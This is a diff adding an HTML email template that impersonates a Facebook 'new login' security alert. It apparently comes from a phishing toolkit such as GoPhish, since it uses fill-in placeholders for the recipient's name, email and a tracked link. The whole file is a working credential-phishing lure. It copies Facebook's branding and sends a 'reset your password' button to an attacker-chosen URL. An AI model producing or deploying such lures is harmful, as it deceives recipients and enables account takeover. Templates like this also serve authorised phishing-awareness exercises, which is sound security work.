@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<title>Facebook Security Alert</title>
+	<style type="text/css">body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+        }
+        .email-content {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 600px;
+            margin: auto;
+        }
+        .header {
+            text-align: center;
+            padding: 20px;
+            border-bottom: 1px solid #e9ebee;
+        }
+        .header img {
+            width: 150px;
+            height: auto;
+        }
+        .body {
+            padding: 20px;
+        }
+        .body p {
+            margin: 0 0 10px;
+            color: #333;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        .code {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+            display: block;
+            margin: 20px 0;
+        }
+        .button {
+            display: inline-block;
+            padding: 10px 20px;
+            font-size: 16px;
+            color: #ffffff;
+            background-color: #1877f2;
+            text-decoration: none;
+            border-radius: 4px;
+            text-align: center;
+        }
+        .button:hover {
+            background-color: #165eab;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #777;
+            border-top: 1px solid #e9ebee;
+        }
+        .footer a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+	</style>
+</head>
+<body>
+<div class="container">
+<div class="email-content">
+<div class="header"><img alt="Facebook Logo" src="https://www.facebook.com/images/fb_icon_325x325.png" /></div>
+
+<div class="body">
+<p>Hi {{.FirstName}},</p>
+
+<p>We noticed a login to your Facebook account from a new location. If this was you, please use the code below to complete the login process:</p>
+
+<p class="code">823013</p>
+
+<p>If this wasn&#39;t you, please <a class="button" href="{{.URL}}" rel="noopener" target="_blank">reset your password</a> to secure your account.</p>
+
+<p>If you need any assistance, please visit our <a href="https://www.facebook.com/help" rel="noopener" target="_blank">Help Center</a>.</p>
+</div>
+
+<div class="footer">
+<p>&copy; 2024 Facebook, Inc. 1 Hacker Way, Menlo Park, CA 94025</p>
+
+<p>This message was sent to <a href="mailto:{{.Email}}">{{.Email}}</a>. If you did not request this change, please disregard this email. <a href="#">Unsubscribe</a></p>
+</div>
+</div>
+</div>
+</body>
+</html>
